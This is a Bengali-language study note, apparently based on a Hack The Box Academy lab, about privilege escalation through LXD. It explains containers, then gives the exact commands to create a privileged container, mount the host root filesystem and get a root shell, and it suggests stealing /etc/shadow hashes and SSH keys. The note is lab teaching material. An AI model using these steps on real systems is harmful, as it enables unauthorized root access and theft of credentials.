# Containers - [LINK](https://academy.hackthebox.com/app/module/51/section/1588)


বর্তমান তথ্যপ্রযুক্তির দুনিয়ায় কন্টেইনার (Containers) একটি অত্যন্ত জনপ্রিয় বিষয়। সিস্টেমে অ্যাক্সেস পাওয়ার পর যদি আমরা দেখি যে সেখানে LXC বা LXD ব্যবহার করা হচ্ছে, তবে কিছু সাধারণ ভুল কনফিগারেশনের সুযোগ নিয়ে আমরা খুব সহজেই পুরো সিস্টেমের রুট (Root) অ্যাক্সেস বা প্রিভিলেজ এসকালেশন করে ফেলতে পারি।

চলুন প্রথমে কন্টেইনারের বেসিক কনসেপ্ট এবং এরপর এটি হ্যাক করার পদ্ধতি ধাপে ধাপে বুঝে নিই।

## কন্টেইনার বনাম ভার্চুয়াল মেশিন (Containers vs VMs)

* **ভার্চুয়াল মেশিন (VM):** এটি হার্ডওয়্যার লেভেলে কাজ করে। একটি মেশিনের ওপর আলাদা আলাদা হার্ডওয়্যার রিসোর্স ভাগ করে একাধিক সম্পূর্ণ অপারেটিং সিস্টেম (OS) চালানো যায়।
* **কন্টেইনার (Container):** এটি অপারেটিং সিস্টেম লেভেলে কাজ করে। কন্টেইনারগুলো হোস্ট মেশিনের অপারেটিং সিস্টেম এবং কার্নেল (Kernel) শেয়ার করে, কিন্তু অ্যাপ্লিকেশন প্রসেসগুলোকে সিস্টেমের বাকি অংশ থেকে সম্পূর্ণ আলাদা (Isolate) করে রাখে।

আইসোলেশন বা আলাদা করে রাখার মূল কারণ হলো সিকিউরিটি এবং রিসোর্স ম্যানেজমেন্ট। অনেক সময় কোনো অ্যাপ্লিকেশনের রুট (Root) পারমিশন দরকার হয় (যেমন- ওয়েব অ্যাপ্লিকেশন বা এপিআই)। কন্টেইনারের মাধ্যমে সেটিকে মেইন সিস্টেম থেকে আলাদা রাখলে, ওই অ্যাপ্লিকেশনের কোনো দুর্বলতা ব্যবহার করে কেউ মূল সিস্টেম বা ডেটাবেস হ্যাক করতে পারে না।

## LXC এবং LXD

* **LXC (Linux Containers):** এটি লিনাক্সের একটি ওএস-লেভেল ভার্চুয়ালাইজেশন টেকনিক। এটি অনেক কম রিসোর্স ব্যবহার করে এবং সহজেই পোর্ট করা যায় (Docker এর মাধ্যমে এটি সবচেয়ে বেশি পরিচিতি পেয়েছে)।
* **LXD (Linux Daemon):** এটি LXC এর মতোই, তবে এটি শুধু অ্যাপ্লিকেশন নয়, বরং পুরো একটি অপারেটিং সিস্টেম কন্টেইনার হিসেবে চালানোর জন্য তৈরি করা হয়েছে।

## LXD ব্যবহার করে প্রিভিলেজ এসকালেশন (Exploitation)

LXD ব্যবহার করে সিস্টেমের রুট পাওয়ার জন্য আমাদের বর্তমান ইউজারকে অবশ্যই `lxc` অথবা `lxd` গ্রুপের মেম্বার হতে হবে।

**ধাপ ১: গ্রুপের মেম্বারশিপ চেক করা**
সিস্টেমে ঢোকার পর প্রথমেই `id` কমান্ড দিয়ে চেক করতে হবে আমাদের ইউজার কোন কোন গ্রুপের সদস্য।

```bash
container-user@nix02:~$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

```

আউটপুটে দেখা যাচ্ছে আমাদের ইউজার `lxd` গ্রুপের সদস্য। অর্থাৎ, আমরা অ্যাটাকটি করতে পারব।

**ধাপ ২: কন্টেইনার ইমেজ বা টেমপ্লেট খোঁজা**
অ্যাটাক করার জন্য আমাদের একটি কন্টেইনার ইমেজ লাগবে। অনেক সময় অ্যাডমিনরা কাজের সুবিধার জন্য সিস্টেমেই পাসওয়ার্ড ছাড়া কিছু আনসিকিউরড টেমপ্লেট রেখে দেন।

```bash
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls
ubuntu-template.tar.xz

```

আমরা সিস্টেমে `ubuntu-template.tar.xz` নামের একটি ইমেজ পেয়ে গেছি।

**ধাপ ৩: ইমেজটি ইম্পোর্ট করা**
এবার এই ইমেজটিকে LXD তে ইম্পোর্ট করে একটি নাম (alias) দিতে হবে, যেমন- `ubuntutemp`।

```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp

```

ইম্পোর্ট সফল হয়েছে কিনা তা দেখতে `lxc image list` কমান্ডটি ব্যবহার করা যায়।

**ধাপ ৪: প্রিভিলেজড কন্টেইনার তৈরি করা (আসল হ্যাকিং)**
এখন আমরা এই ইমেজটি থেকে `privesc` নামে একটি কন্টেইনার তৈরি করব। এখানে সবচেয়ে গুরুত্বপূর্ণ অংশটি হলো `security.privileged=true` ফ্ল্যাগটি যুক্ত করা। এটি কন্টেইনারের সব সিকিউরিটি এবং আইসোলেশন ভেঙে দেয়, যার ফলে কন্টেইনারের ভেতরের রুট ইউজার হোস্ট মেশিনের রুট ইউজারের সমান ক্ষমতা পেয়ে যায়।

```bash
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true

```

**ধাপ ৫: হোস্ট মেশিনের হার্ডডিস্ক মাউন্ট করা**
কন্টেইনার তো তৈরি হলো, কিন্তু হোস্ট মেশিনের ফাইলগুলোর অ্যাক্সেস তো পেতে হবে! তাই আমরা হোস্ট মেশিনের মেইন রুট ডিরেক্টরি (`source=/`) কন্টেইনারের ভেতরের একটি ডিরেক্টরির (`path=/mnt/root`) সাথে যুক্ত বা মাউন্ট করে দেব।

```bash
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

```

**ধাপ ৬: কন্টেইনার চালু করা এবং রুট শেল নেওয়া**
এবার শুধু কন্টেইনারটি স্টার্ট করতে হবে এবং এর ভেতরে একটি ব্যাশ শেল (bash) ওপেন করতে হবে।

```bash
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash

```

**ফলাফল:**
আপনি এখন কন্টেইনারের ভেতরে রুট (Root) ইউজার হিসেবে আছেন! যেহেতু আমরা হোস্ট মেশিনের পুরো হার্ডডিস্ক কন্টেইনারের `/mnt/root` ফোল্ডারে মাউন্ট করেছিলাম, তাই সেখানে গেলে আপনি হোস্ট মেশিনের সব ফাইল দেখতে পারবেন এবং রুট পারমিশন নিয়ে যেকোনো ফাইল এডিট করতে পারবেন।

```bash
root@nix02:~# ls -l /mnt/root

```

এখান থেকে আপনি খুব সহজেই হোস্ট মেশিনের `/etc/shadow` ফাইল পড়ে অন্যান্য ইউজারদের পাসওয়ার্ড হ্যাশ চুরি করতে পারবেন বা রুট ইউজারের SSH Key বের করে নিতে পারবেন।
